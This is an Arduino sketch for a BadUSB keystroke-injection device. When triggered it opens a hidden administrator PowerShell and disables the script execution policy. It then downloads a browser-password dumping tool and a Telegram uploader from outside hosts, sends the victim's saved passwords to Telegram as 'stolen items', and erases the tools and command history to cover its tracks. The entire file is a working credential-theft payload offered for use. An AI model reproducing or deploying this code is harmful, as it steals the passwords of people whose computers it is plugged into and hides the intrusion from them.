#include "Keyboard.h"

void typeKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void runCommand(String cmd) {
  Keyboard.print(cmd);
  delay(150);
  typeKey(KEY_RETURN);
  delay(150);
}

void setup() {
  // put your setup code here, to run once:
  Keyboard.begin();
  Serial.begin(9600);
}

void loop() {
  if (Serial.available()) {
    String text = Serial.readStringUntil('\n');
    if (text == "meowchiato") {
      run();
    }
  }
  delay(5000);
  // put your main code here, to run repeatedly:
}

void run() {
  //Minimize all programs
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  delay(500);

  // Start powershell as admin

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("powershell.exe -windowstyle hidden");
  delay(200);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  //Go to public documents directory
  runCommand("cd C:\\Users\\Public\\Documents");

  //Create folder /dump
  runCommand("mkdir dump");

  //Disable script blocker
  runCommand("Set-ExecutionPolicy unrestricted -Force");

  //Download the nirsoft tool for browser passwords
  runCommand("Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe");

  //Download uploader file to upload all informations on telegram
  runCommand("Invoke-WebRequest \"https://www.dropbox.com/scl/fi/bokfx3c7zyhtewtrjacay/telegram_uploader.exe?rlkey=iti2b64uhwwbg62w7zqpvlr5k&dl=1\" -OutFile telegram_uploader.exe");

  //Delay for downloading
  delay(3500);

  //Create the file for Browser passwords
  runCommand(".\\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt");
  delay(5000);

  //Move txt data to /dump
  runCommand("Move-Item -Path \"$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt\" -Destination dump/");

  //Compress dump/ folder to upload it on telegram
  runCommand("Compress-Archive dump/ dump.zip -Force");

  //Upload dump.zip on telegram
  runCommand("./telegram_uploader.exe -f dump.zip -c \"Here are all stolen items, meoww~~\"");
  delay(5000);

  //Delete nirsoft tools
  runCommand("Remove-Item WebBrowserPassView.exe");
  runCommand("Remove-Item telegram_uploader.exe");

  //Delete all files downloaded before
  runCommand("Remove-Item -r dump/");
  runCommand("Remove-Item dump.zip");
  runCommand("Clear-Content (Get-PSReadlineOption).HistorySavePath");  //Clear powershell command history
  runCommand("taskkill -F /IM powershell.exe");                        //Kill all powershell process


  // Make capslock flash to know when you can unplug the BadUSB

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(2000);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  // End of Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}
